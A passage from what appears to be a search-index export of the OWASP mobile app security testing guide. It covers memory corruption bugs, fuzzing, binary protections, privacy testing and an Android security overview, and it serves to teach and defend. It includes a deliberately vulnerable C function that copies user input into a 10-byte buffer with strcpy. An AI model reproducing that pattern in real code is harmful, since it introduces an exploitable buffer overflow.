For example, if the integer type were to represent the length of a buffer, this could create a buffer overflow vulnerability.</p> </li> <li> <p>Format string vulnerabilities: When unchecked user input is passed to the format string parameter of the <code>printf</code> family of C functions, attackers may inject format tokens such as '%c' and '%n' to access memory. Format string bugs are convenient to exploit due to their flexibility. Should a program output the result of the string formatting operation, the attacker can read and write to memory arbitrarily, thus bypassing protection features such as ASLR.</p> </li> </ul> <p>The primary goal in exploiting memory corruption is usually to redirect program flow into a location where the attacker has placed assembled machine instructions referred to as shellcode. On iOS, the data execution prevention feature (as the name implies) prevents execution from memory defined as data segments. To bypass this protection, attackers leverage return-oriented programming (ROP). This process involves chaining together small, pre-existing code chunks (\"gadgets\") in the text segment where these gadgets may execute a function useful to the attacker or, call <code>mprotect</code> to change memory protection settings for the location where the attacker stored the shellcode.</p> <p>Android apps are, for the most part, implemented in Java which is inherently safe from memory corruption issues by design. However, native apps utilizing JNI libraries are susceptible to this kind of bug. In rare cases, Android apps that use XML/JSON parsers to unwrap Java objects are also subject to memory corruption bugs. An example of such vulnerability was found in the PayPal app.</p> <p>Similarly, iOS apps can wrap C/C++ calls in Obj-C or Swift, making them susceptible to these kind of attacks.</p> <p>Example:</p> <p>The following code snippet shows a simple example for a condition resulting in a buffer overflow vulnerability.</p> <pre><code> void copyData(char *userId) {\n    char  smallBuffer[10]; // size of 10\n    strcpy(smallBuffer, userId);\n }\n</code></pre> <p>To identify potential buffer overflows, look for uses of unsafe string functions (<code>strcpy</code>, <code>strcat</code>, other functions beginning with the \"str\" prefix, etc.) and potentially vulnerable programming constructs, such as copying user input into a limited-size buffer. The following should be considered red flags for unsafe string functions:</p> <ul> <li><code>strcat</code></li> <li><code>strcpy</code></li> <li><code>strncat</code></li> <li><code>strlcat</code></li> <li><code>strncpy</code></li> <li><code>strlcpy</code></li> <li><code>sprintf</code></li> <li><code>snprintf</code></li> <li><code>gets</code></li> </ul> <p>Also, look for instances of copy operations implemented as \"for\" or \"while\" loops and verify length checks are performed correctly.</p> <p>Verify that the following best practices have been followed:</p> <ul> <li>When using integer variables for array indexing, buffer length calculations, or any other security-critical operation, verify that unsigned integer types are used and perform precondition tests are performed to prevent the possibility of integer wrapping.</li> <li>The app does not use unsafe string functions such as <code>strcpy</code>, most other functions beginning with the \"str\" prefix, <code>sprint</code>, <code>vsprintf</code>, <code>gets</code>, etc.;</li> <li>If the app contains C++ code, ANSI C++ string classes are used;</li> <li>In case of <code>memcpy</code>, make sure you check that the target buffer is at least of equal size as the source and that both buffers are not overlapping.</li> <li>iOS apps written in Objective-C use NSString class. C apps on iOS should use CFString, the Core Foundation representation of a string.</li> <li>No untrusted data is concatenated into format strings.</li> </ul>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#static-analysis-security-testing-considerations_1","title":"Static Analysis Security Testing Considerations","text":"<p>Static code analysis of low-level code is a complex topic that could easily fill its own book. Automated tools such as RATS combined with limited manual inspection efforts are usually sufficient to identify low-hanging fruits. However, memory corruption conditions often stem from complex causes. For example, a use-after-free bug may actually be the result of an intricate, counter-intuitive race condition not immediately apparent. Bugs manifesting from deep instances of overlooked code deficiencies are generally discovered through dynamic analysis or by testers who invest time to gain a deep understanding of the program.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#dynamic-analysis-security-testing-considerations_1","title":"Dynamic Analysis Security Testing Considerations","text":"<p>Memory corruption bugs are best discovered via input fuzzing: an automated black-box software testing technique in which malformed data is continually sent to an app to survey for potential vulnerability conditions. During this process, the application is monitored for malfunctions and crashes. Should a crash occur, the hope (at least for security testers) is that the conditions creating the crash reveal an exploitable security flaw.</p> <p>Fuzz testing techniques or scripts (often called \"fuzzers\") will typically generate multiple instances of structured input in a semi-correct fashion. Essentially, the values or arguments generated are at least partially accepted by the target application, yet also contain invalid elements, potentially triggering input processing flaws and unexpected program behaviors. A good fuzzer exposes a substantial amount of possible program execution paths (i.e. high coverage output). Inputs are either generated from scratch (\"generation-based\") or derived from mutating known, valid input data (\"mutation-based\").</p> <p>For more information on fuzzing, refer to the OWASP Fuzzing Guide.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#binary-protection-mechanisms","title":"Binary Protection Mechanisms","text":"","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#position-independent-code","title":"Position Independent Code","text":"<p>PIC (Position Independent Code) is code that, being placed somewhere in the primary memory, executes properly regardless of its absolute address. PIC is commonly used for shared libraries, so that the same library code can be loaded in a location in each program address space where it does not overlap with other memory in use (for example, other shared libraries).</p> <p>PIE (Position Independent Executable) are executable binaries made entirely from PIC. PIE binaries are used to enable ASLR (Address Space Layout Randomization) which randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#memory-management","title":"Memory Management","text":"","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#automatic-reference-counting","title":"Automatic Reference Counting","text":"<p>ARC (Automatic Reference Counting) is a memory management feature of the Clang compiler exclusive to Objective-C and Swift. ARC automatically frees up the memory used by class instances when those instances are no longer needed. ARC differs from tracing garbage collection in that there is no background process that deallocates the objects asynchronously at runtime.</p> <p>Unlike tracing garbage collection, ARC does not handle reference cycles automatically. This means that as long as there are \"strong\" references to an object, it will not be deallocated. Strong cross-references can accordingly create deadlocks and memory leaks. It is up to the developer to break cycles by using weak references. You can learn more about how it differs from Garbage Collection here.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#garbage-collection","title":"Garbage Collection","text":"<p>Garbage Collection (GC) is an automatic memory management feature of some languages such as Java/Kotlin/Dart. The garbage collector attempts to reclaim memory which was allocated by the program, but is no longer referenced\u2014also called garbage. The Android runtime (ART) makes use of an improved version of GC. You can learn more about how it differs from ARC here.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#manual-memory-management","title":"Manual Memory Management","text":"<p>Manual memory management is typically required in native libraries written in C/C++ where ARC and GC do not apply. The developer is responsible for doing proper memory management. Manual memory management is known to enable several major classes of bugs into a program when used incorrectly, notably violations of memory safety or memory leaks.</p> <p>More information can be found in \"Memory Corruption Bugs\".</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04h-Testing-Code-Quality/#stack-smashing-protection","title":"Stack Smashing Protection","text":"<p>Stack canaries help prevent stack buffer overflow attacks by storing a hidden integer value on the stack right before the return pointer. This value is then validated before the return statement of the function is executed. A buffer overflow attack often overwrites a region of memory in order to overwrite the return pointer and take over the program flow. If stack canaries are enabled, they will be overwritten as well and the CPU will know that the memory has been tampered with.</p> <p>Stack buffer overflow is a type of the more general programming vulnerability known as buffer overflow (or buffer overrun). Overfilling a buffer on the stack is more likely to derail program execution than overfilling a buffer on the heap because the stack contains the return addresses for all active function calls.</p>","tags":["all","MASVS-CODE"]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/","title":"Mobile App User Privacy Protection","text":"","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#overview","title":"Overview","text":"<p>IMPORTANT DISCLAIMER: The MASTG is not a legal handbook and it will not go into the specifics of the GDPR or other possibly relevant legislation here. Instead, this chapter will introduce you to the topics related to user privacy protection, provide you with essential references for your own research efforts, and give you tests or guidelines that determine whether an app adheres to the privacy-related requirements listed in the OWASP MASVS.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#the-main-problem","title":"The Main Problem","text":"<p>Mobile apps handle all kinds of sensitive user data, from identification and banking information to health data, so both the developers and the public are understandably concerned about how this data is handled and where it ends up. It is also worth discussing the \"benefits users get from using the apps\" vs \"the real price that they are paying for it\" (often without even being aware of it).</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#the-solution-pre-2020","title":"The Solution (pre-2020)","text":"<p>To ensure that users are properly protected, legislation such as the European Union's General Data Protection Regulation (GDPR) in Europe have been developed and deployed (applicable since May 25, 2018). These laws can force developers to be more transparent regarding the handling of sensitive user data, which is usually implemented with privacy policies.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#the-challenge","title":"The Challenge","text":"<p>Consider these dimensions of mobile app privacy:</p> <ul> <li>Developer Compliance: Developers need to be aware of laws about user privacy so their work is compliant. Ideally, the following principles must be followed:<ul> <li>Privacy-by-Design approach (Art. 25 GDPR, \"Data protection by design and by default\").</li> <li>Principle of Least Privilege (\"Every program and every user of the system should operate using the least set of privileges necessary to complete the job.\")</li> </ul> </li> <li>User Education: Users need to be educated about their sensitive data and informed about how to use the application properly (to ensure secure handling and processing of their information).</li> </ul> <p>Note: More often than not apps will claim to handle certain data, but in reality that's not the case. The IEEE article \"Engineering Privacy in Smartphone Apps: A Technical Guideline Catalog for App Developers\" by Majid Hatamian gives a very nice introduction to this topic.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#goals-for-data-protection","title":"Goals for Data Protection","text":"<p>When an app requests personal information from a user, the user needs to know why the app needs that data and how it is used by the app. If there is a third party doing the actual processing of the data, the app should tell the user that too.</p> <p>Like the classic triad of security protection goals: confidentiality, integrity, and availability, there are three protection goals that have been proposed for data protection:</p> <ul> <li>Unlinkability:<ul> <li>Users' privacy-relevant data is unlinkable to any other set of privacy-relevant data outside of the domain.</li> <li>Includes: data minimization, anonymization, pseudonymization, etc.</li> </ul> </li> <li>Transparency:<ul> <li>Users should know how to request all information that the application has on them and be aware of all the information that the app has on them.</li> <li>Includes: privacy policies, user education, proper logging and auditing mechanisms, etc.</li> </ul> </li> <li>Intervenability:<ul> <li>Users should know how to correct their personal information, request its deletion, withdraw any given consent at any time, and receive instructions on how to do so.</li> <li>Includes: privacy settings directly in the app, single points of contact for individuals' intervention requests (e.g. in-app chat, telephone number, e-mail), etc.</li> </ul> </li> </ul> <p>For more details, see Section 5.1.1 \"Introduction to data protection goals\" in ENISA's \"Privacy and data protection in mobile applications\".</p> <p>Since it is very challenging (if not impossible in many cases) to address both security and privacy protection goals at the same time, it is worth examining an visualization in IEEE's publication Protection Goals for Privacy Engineering called \"The Three Axes\" which helps us understand why we cannot reach 100% of each of all six goals simultaneously.</p> <p>Though a privacy policy traditionally protects most of the these processes, that approach is not always optimal because:</p> <ul> <li>Developers are not legal experts but still need to be compliant with legislation.</li> <li>Users almost always have to read long and wordy policies.</li> </ul>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#the-new-approach-google-and-apple","title":"The New Approach (Google and Apple)","text":"<p>In order to address these challenges and better inform users, Google and Apple have introduced new privacy labeling systems (very much along the lines of NIST's proposal) to help users easily understand how their data is being collected, handled, and shared, Consumer Software Cybersecurity Labeling. Their approaches can be seen at:</p> <ul> <li>The App Store Nutrition Labels (since 2020).</li> <li>The Google Play Data Safety Section (since 2021).</li> </ul> <p>Since this is a new requirement on both platforms, these labels must be accurate in order to reassure users and mitigate abuse.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#google-ada-masa-program","title":"Google ADA MASA Program","text":"<p>Since regular security testing helps developers identify key vulnerabilities in their apps, Google Play will allow developers who have completed independent security validation to inform users by disclosing this fact in the app's Data Safety section. The developer's commitment to security and privacy is meant to reassure users.</p> <p>As part of the process to provide more transparency into the app's security architecture, Google has introduced the MASA (Mobile Application Security Assessment) program as part of the App Defense Alliance (ADA). Since MASA is a globally recognized standard for mobile app security to the mobile app ecosystem, Google is acknowledging the importance of security in this industry. Developers can work directly with an Authorized Lab partner to initiate a security assessment that is independently validated against a set of MASVS Level 1 requirements, and Google will recognize this effort by allowing them to disclose these tests in the app's Data Safety section.</p> <p></p> <p>If you are a developer and would like to participate, complete the Independent Security Review form.</p> <p>Of course the testing is limited and it does not guarantee complete safety of the application. The independent review may not be scoped to verify the accuracy and completeness of a developer's Data Safety declarations, and developers remain solely responsible for making complete and accurate declarations in their app's Play Store listing.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#references","title":"References","text":"<p>You can learn more about this and other privacy related topics here:</p> <ul> <li>iOS App Privacy Policy</li> <li>iOS Privacy Details Section on the App Store</li> <li>iOS Privacy Best Practices</li> <li>Android App Privacy Policy</li> <li>Android Data Safety Section on Google Play</li> <li>Preparing your app for the new Data safety section in Google Play</li> <li>Android Privacy Best Practices</li> </ul>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#testing-for-privacy-in-mobile-apps","title":"Testing for Privacy in Mobile Apps","text":"<p>Security testers should be aware of Google Play's list of common privacy violations though it is not exhaustive. Some of the examples are below:</p> <ul> <li>Example 1: An app that accesses a user's inventory of installed apps and doesn't treat this data as personal or sensitive data by sending it over the network (violating MSTG-STORAGE-4) or to another app via IPC mechanisms (violating MSTG-STORAGE-6).</li> <li>Example 2: An app displays sensitive data such as credit card details or user passwords without user authorization e.g. biometrics (violating MSTG-AUTH-10).</li> <li>Example 3: An app that accesses a user's phone or contact book data and doesn't treat this data as personal or sensitive data, additionally sending it over an unsecured network connection (violating MSTG-NETWORK-1).</li> <li>Example 4: An app collects device location (which is apparently not required for its proper functioning) and does not have a prominent disclosure explaining which feature uses this data (violating MSTG-PLATFORM-1).</li> </ul> <p>You can find more common violations in Google Play Console Help by going to Policy Centre -&gt; Privacy, deception and device abuse -&gt; User data.</p> <p>As you might expect, these testing categories are related to each other. When you're testing them you're often indirectly testing for user privacy protection. This fact will allow you to help you provide better and more comprehensive reports. Often you'll be able to reuse evidence from other tests in order to test for User Privacy Protection).</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#testing-disclosure-of-data-privacy-on-the-app-marketplace","title":"Testing Disclosure of Data Privacy on the App Marketplace","text":"<p>This document is only interested in determining which privacy-related information is being disclosed by the developers and discussing how to evaluate this information to decide if it seems reasonable (similarly as you'd do when testing for permissions).</p> <p>While it is possible that the developers are not declaring certain information that is indeed being collected and\\/or shared, that is a topic for a different test. In this test, you are not supposed to provide privacy violation assurance.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#static-analysis","title":"Static Analysis","text":"<p>To perform a static analysis, follow these steps:</p> <ol> <li>Search for the app in the corresponding app marketplace (e.g. Google Play, App Store).</li> <li>Go to the section \"Privacy Details\" (App Store) or \"Safety Section\" (Google Play).</li> <li>Determine if there is any information available at all.</li> </ol> <p>The app passes the test as long as the developer has complied with the app marketplace guidelines and included the required labels and explanations. The developer's disclosures in the app marketpace should be stored as evidence, so that you can later use it to determine potential violations of privacy or data protection.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>As an optional step, you can also provide some kind of evidence as part of this test. For instance, if you're testing an iOS app you can easily enable app activity recording and export a Privacy Report that contains detailed app access to different resources such as photos, contacts, camera, microphone, network connections, etc.</p> <p>A dynamic analysis has many advantages for testing other MASVS categories and it provides very useful information that you can use to test network communication for MASVS-NETWORK or when testing app interaction with the platform for MASVS-PLATFORM. While testing these other categories, you might have taken similar measurements using other testing tools. You can also provide this as evidence for this test.</p> <p>Though the information available should be compared against what the app is actually meant to do, this will be far from a trivial task that could take from several days to weeks to finish depending on your resources and the capabilities of your automated tools. These tests also heavily depends on the app functionality and context and should be ideally performed on a white box setup working very closely with the app developers.</p>","tags":[]},{"location":"MASTG/0x04i-Testing-User-Privacy-Protection/#testing-user-education-on-security-best-practices","title":"Testing User Education on Security Best Practices","text":"<p>Determining whether the app educates users and helps them understand security needs is especially challenging if you intend to automate the process. We recommend using the app extensively and try to answer the following questions whenever applicable:</p> <ul> <li> <p>Fingerprint usage: When fingerprints are used for authentication providing access to high-risk transactions/information,</p> <p>does the app inform the user about potential issues when having multiple fingerprints of other people registered to the device as well?</p> </li> <li> <p>Rooting/jailbreaking: When root or jailbreak detection is implemented,</p> <p>does the app inform the user of the fact that certain high-risk actions will carry additional risk due to the jailbroken/rooted status of the device?</p> </li> <li> <p>Specific credentials: When a user gets a recovery code, a password, or a pin from the application (or sets one),</p> <p>does the app instruct the user to never share this with anyone else and that only the app will request it?</p> </li> <li> <p>Application distribution: In case of a high-risk application and in order to prevent users from downloading compromised versions of the application,</p> <p>does the app manufacturer properly communicate the official way of distributing the app (e.g. from Google Play or the App Store)?</p> </li> <li> <p>Prominent Disclosure: In any case,</p> <p>does the app display prominent disclosure of data access, collection, use, and sharing? e.g. does the app use the App Tracking Transparency Framework to ask for the permission on iOS?</p> </li> </ul> <p>Other references include:</p> <ul> <li>Open-Source Licenses in Android - https://www.bignerdranch.com/blog/open-source-licenses-and-android/</li> <li>Software Licenses in Plain English - https://tldrlegal.com/</li> <li>Apple's approach to access private data - https://developer.apple.com/design/human-interface-guidelines/privacy</li> <li>Android app permissions best practices - https://developer.android.com/training/permissions/requesting.html#explain</li> </ul>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/","title":"Android Platform Overview","text":"<p>This chapter introduces the Android platform from an architecture point of view. The following five key areas are discussed:</p> <ol> <li>Android architecture</li> <li>Android security: defense-in-depth approach</li> <li>Android application structure</li> <li>Android application publishing</li> <li>Android application attack surface</li> </ol> <p>Visit the official Android developer documentation website for more details about the Android platform.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#android-architecture","title":"Android Architecture","text":"<p>Android is a Linux-based open source platform developed by the Open Handset Alliance (a consortium lead by Google), which serves as a mobile operating system (OS). Today the platform is the foundation for a wide variety of modern technology, such as mobile phones, tablets, wearable tech, TVs, and other smart devices. Typical Android builds ship with a range of pre-installed (\"stock\") apps and support installation of third-party apps through the Google Play store and other marketplaces.</p> <p>Android's software stack is composed of several different layers. Each layer defines interfaces and offers specific services.</p> <p></p> <p>Kernel: At the lowest level, Android is based on a variation of the Linux Kernel containing some significant additions, including Low Memory Killer, wake locks, the Binder IPC driver, etc. For the purpose of the MASTG, we'll focus on the user-mode part of the OS, where Android significantly differs from a typical Linux distribution. The two most important components for us are the managed runtime used by applications (ART/Dalvik) and Bionic, Android's version of glibc, the GNU C library.</p> <p>HAL: On top of the kernel, the Hardware Abstraction Layer (HAL) defines a standard interface for interacting with built-in hardware components. Several HAL implementations are packaged into shared library modules that the Android system calls when required. This is the basis for allowing applications to interact with the device's hardware. For example, it allows a stock phone application to use a device's microphone and speaker.</p> <p>Runtime Environment: Android apps are written in Java and Kotlin and then compiled to Dalvik bytecode which can be then executed using a runtime that interprets the bytecode instructions and executes them on the target device. For Android, this is the Android Runtime (ART). This is similar to the JVM (Java Virtual Machine) for Java applications, or the Mono Runtime for .NET applications.</p> <p>Dalvik bytecode is an optimized version of Java bytecode. It is created by first compiling the Java or Kotlin code to Java bytecode, using the javac and kotlinc compilers respectively, producing .class files. Finally, the Java bytecode is converted to Dalvik bytecode using the d8 tool. Dalvik bytecode is packed within APK and AAB files in the form of .dex files and is used by a managed runtime on Android to execute it on the device.</p> <p></p> <p>Before Android 5.0 (API level 21), Android executed bytecode on the Dalvik Virtual Machine (DVM), where it was translated into machine code at execution time, a process known as just-in-time (JIT) compilation. This enables the runtime to benefit from the speed of compiled code while maintaining the flexibility of code interpretation.</p> <p>Since Android 5.0 (API level 21), Android executes bytecode on the Android Runtime (ART) which is the successor of the DVM. ART provides improved performance as well as context information in app native crash reports, by including both Java and native stack information. It uses the same Dalvik bytecode input to maintain backward compatibility. However, ART executes the Dalvik bytecode differently, using a hybrid combination of ahead-of-time (AOT), just-in-time (JIT) and profile-guided compilation.</p> <ul> <li>AOT pre-compiles Dalvik bytecode into native code, and the generated code will be saved on disk with the .oat extension (ELF binary). The dex2oat tool can be used to perform the compilation and can be found at /system/bin/dex2oat on Android devices. AOT compilation is executed during the installation of the app. This makes the application start faster, as no compilation is needed anymore. However, this also means that the install time increases as compared to JIT compilation. Additionally, since applications are always optimized against the current version of the OS, this means that software updates will recompile all previously compiled applications, resulting in a significant increase in the system update time. Finally, AOT compilation will compile the entire application, even if certain parts are never used by the user.</li> <li>JIT happens at runtime.</li> <li>Profile-guided compilation is a hybrid approach that was introduced in Android 7 (API level 24) to combat the downsides of AOT. At first, the application will use JIT compilation, and Android keeps track of all the parts of the application that are frequently used. This information is stored in an application profile and when the device is idle, a compilation (dex2oat) daemon runs which AOT compiles the identified frequent code paths from the profile.</li> </ul> <p></p> <p>Source: https://lief-project.github.io/doc/latest/tutorials/10_android_formats.html</p> <p>Sandboxing: Android apps don't have direct access to hardware resources, and each app runs in its own virtual machine or sandbox. This enables the OS to have precise control over resources and memory access on the device. For instance, a crashing app doesn't affect other apps running on the same device. Android controls the maximum number of system resources allocated to apps, preventing any one app from monopolizing too many resources. At the same time, this sandbox design can be considered as one of the many principles in Android's global defense-in-depth strategy. A malicious third-party application, with low privileges, shouldn't be able to escape its own runtime and read the memory of a victim application on the same device. In the following section we take a closer look at the different defense layers in the Android operating system. Learn more in the section \"Software Isolation\".</p> <p>You can find more detailed information in the Google Source article \"Android Runtime (ART)\", the book \"Android Internals\" by Jonathan Levin and the blog post \"Android 101\" by @_qaz_qaz.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#android-security-defense-in-depth-approach","title":"Android Security: Defense-in-Depth Approach","text":"<p>The Android architecture implements different security layers that, together, enable a defense-in-depth approach. This means that the confidentiality, integrity or availability of sensitive user-data or applications doesn't hinge on one single security measure. This section brings an overview of the different layers of defense that the Android system provides. The security strategy can be roughly categorized into four distinct domains, each focusing on protecting against certain attack models.</p> <ul> <li>System-wide security</li> <li>Software isolation</li> <li>Network security</li> <li>Anti-exploitation</li> </ul>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#system-wide-security","title":"System-wide security","text":"","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#device-encryption","title":"Device encryption","text":"<p>Android supports device encryption from Android 2.3.4 (API level 10) and it has undergone some big changes since then. Google imposed that all devices running Android 6.0 (API level 23) or higher had to support storage encryption, although some low-end devices were exempt because it would significantly impact their performance.</p> <ul> <li> <p>Full-Disk Encryption (FDE): Android 5.0 (API level 21) and above support full-disk encryption. This encryption uses a single key protected by the user's device password to encrypt and decrypt the user data partition. This kind of encryption is now considered deprecated and file-based encryption should be used whenever possible. Full-disk encryption has drawbacks, such as not being able to receive calls or not having operative alarms after a reboot if the user does not enter the password to unlock.</p> </li> <li> <p>File-Based Encryption (FBE): Android 7.0 (API level 24) supports file-based encryption. File-based encryption allows different files to be encrypted with different keys so they can be deciphered independently. Devices that support this type of encryption support Direct Boot as well. Direct Boot enables the device to have access to features such as alarms or accessibility services even if the user didn't unlock the device.</p> </li> </ul> <p>Note: you might hear of Adiantum, which is an encryption method designed for devices running Android 9 (API level 28) and higher whose CPUs lack AES instructions. Adiantum is only relevant for ROM developers or device vendors, Android does not provide an API for developers to use Adiantum from applications. As recommended by Google, Adiantum should not be used when shipping ARM-based devices with ARMv8 Cryptography Extensions or x86-based devices with AES-NI. AES is faster on those platforms.</p> <p>Further information is available in the Android documentation.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#trusted-execution-environment-tee","title":"Trusted Execution Environment (TEE)","text":"<p>In order for the Android system to perform encryption it needs a way to securely generate, import and store cryptographic keys. We are essentially shifting the problem of keeping sensitive data secure towards keeping a cryptographic key secure. If the attacker can dump or guess the cryptographic key, the sensitive encrypted data can be retrieved.</p> <p>Android offers a trusted execution environment in dedicated hardware to solve the problem of securely generating and protecting cryptographic keys. This means that a dedicated hardware component in the Android system is responsible for handling cryptographic key material. Three main modules are responsible for this:</p> <ul> <li> <p>Hardware-backed KeyStore: This module offers cryptographic services to the Android OS and third-party apps. It enables apps to perform cryptographic sensitive operations in an TEE without exposing the cryptographic key material.</p> </li> <li> <p>StrongBox: In Android 9 (Pie), StrongBox was introduced, another approach to implement a hardware-backed KeyStore. While previous to Android 9 Pie, a hardware-backed KeyStore would be any TEE implementation that lies outside of the Android OS kernel. StrongBox is an actual complete separate hardware chip that is added to the device on which the KeyStore is implemented and is clearly defined in the Android documentation. You can check programmatically whether a key resides in StrongBox and if it does, you can be sure that it is protected by a hardware security module that has its own CPU, secure storage, and True Random Number Generator (TRNG). All the sensitive cryptographic operations happen on this chip, in the secure boundaries of StrongBox.</p> </li> <li> <p>GateKeeper: The GateKeeper module enables device pattern and password authentication. The security sensitive operations during the authentication process happen inside the TEE that is available on the device. GateKeeper consists of three main components, (1) <code>gatekeeperd</code> which is the service that exposes GateKeeper, (2) GateKeeper HAL, which is the hardware interface and (3) the TEE implementation which is the actual software that implements the GateKeeper functionality in the TEE.</p> </li> </ul>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#verified-boot","title":"Verified Boot","text":"<p>We need to have a way to ensure that code that is being executed on Android devices comes from a trusted source and that its integrity is not compromised. In order to achieve this, Android introduced the concept of verified boot. The goal of verified boot is to establish a trust relationship between the hardware and the actual code that executes on this hardware. During the verified boot sequence, a full chain of trust is established starting from the hardware-protected Root-of-Trust (RoT) up until the final system that is running, passing through and verifying all the required boot phases. When the Android system is finally booted you can rest assured that the system is not tampered with. You have cryptographic proof that the code which is running is the one that is intended by the OEM and not one that has been maliciously or accidentally altered.</p> <p>Further information is available in the Android documentation.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#software-isolation","title":"Software Isolation","text":"","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#android-users-and-groups","title":"Android Users and Groups","text":"<p>Even though the Android operating system is based on Linux, it doesn't implement user accounts in the same way other Unix-like systems do. In Android, the multi-user support of the Linux kernel is used to sandbox apps: with a few exceptions, each app runs as though under a separate Linux user, effectively isolated from other apps and the rest of the operating system.</p> <p>The file android_filesystem_config.h includes a list of the predefined users and groups system processes are assigned to. UIDs (userIDs) for other applications are added as the latter are installed.</p> <p>For example, Android 9.0 (API level 28) defines the following system users:</p> <pre><code>    #define AID_ROOT             0  /* traditional unix root user */\n    #...\n    #define AID_SYSTEM        1000  /* system server */\n    #...\n    #define AID_SHELL         2000  /* adb and debug shell user */\n    #...\n    #define AID_APP_START          10000  /* first app user */\n    ...\n</code></pre>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#selinux","title":"SELinux","text":"<p>Security-Enhanced Linux (SELinux) uses a Mandatory Access Control (MAC) system to further lock down which processes should have access to which resources. Each resource is given a label in the form of <code>user:role:type:mls_level</code> which defines which users are able to execute which types of actions on it. For example, one process may only be able to read a file, while another process may be able to edit or delete the file. This way, by working on a least-privilege principle, vulnerable processes are more difficult to exploit via privilege escalation or lateral movement.</p> <p>Further information is available on the Android documentation.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#permissions","title":"Permissions","text":"<p>Android implements an extensive permissions system that is used as an access control mechanism. It ensures controlled access to sensitive user data and device resources. Android categorizes permissions into different types offering various protection levels.</p> <p>Prior to Android 6.0 (API level 23), all permissions an app requested were granted at installation (Install-time permissions). From API level 23 onwards, the user must approve some permissions requests during runtime (Runtime permissions).</p> <p>Further information is available in the Android documentation including several considerations and best practices.</p> <p>To learn how to test app permissions refer to the Testing App Permissions section in the \"Android Platform APIs\" chapter.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#network-security","title":"Network security","text":"","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#tls-by-default","title":"TLS by Default","text":"<p>By default, since Android 9 (API level 28), all network activity is treated as being executed in a hostile environment. This means that the Android system will only allow apps to communicate over a network channel that is established using the Transport Layer Security (TLS) protocol. This protocol effectively encrypts all network traffic and creates a secure channel to a server. It may be the case that you would want to use clear traffic connections for legacy reasons. This can be achieved by adapting the <code>res/xml/network_security_config.xml</code> file in the application.</p> <p>Further information is available in the Android documentation.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#dns-over-tls","title":"DNS over TLS","text":"<p>System-wide DNS over TLS support has been introduced since Android 9 (API level 28). It allows you to perform queries to DNS servers using the TLS protocol. A secure channel is established with the DNS server through which the DNS query is sent. This assures that no sensitive data is exposed during a DNS lookup.</p> <p>Further information is available on the Android Developers blog.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#anti-exploitation","title":"Anti-exploitation","text":"","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#aslr-kaslr-pie-and-dep","title":"ASLR, KASLR, PIE and DEP","text":"<p>Address Space Layout Randomization (ASLR), which has been part of Android since Android 4.1 (API level 15), is a standard protection against buffer-overflow attacks, which makes sure that both the application and the OS are loaded to random memory addresses making it difficult to get the correct address for a specific memory region or library. In Android 8.0 (API level 26), this protection was also implemented for the kernel (KASLR). ASLR protection is only possible if the application can be loaded at a random place in memory, which is indicated by the Position Independent Executable (PIE) flag of the application. Since Android 5.0 (API level 21), support for non-PIE enabled native libraries was dropped. Finally, Data Execution Prevention (DEP) prevents code execution on the stack and heap, which is also used to combat buffer-overflow exploits.</p> <p>Further information is available on the Android Developers blog.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#seccomp-filter","title":"SECCOMP Filter","text":"<p>Android applications can contain native code written in C or C++. These compiled binaries can communicate both with the Android Runtime through Java Native Interface (JNI) bindings, and with the OS through system calls. Some system calls are either not implemented, or are not supposed to be called by normal applications. As these system calls communicate directly with the kernel, they are a prime target for exploit developers. With Android 8 (API level 26), Android has introduced the support for Secure Computing (SECCOMP) filters for all Zygote based processes (i.e. user applications). These filters restrict the available syscalls to those exposed through bionic.</p> <p>Further information is available on the Android Developers blog.</p>","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#android-application-structure","title":"Android Application Structure","text":"","tags":[]},{"location":"MASTG/0x05a-Platform-Overview/#communication-with-the-operating-system","title":"Communication with the Operating System","text":"<p>Android apps interact with system services via the 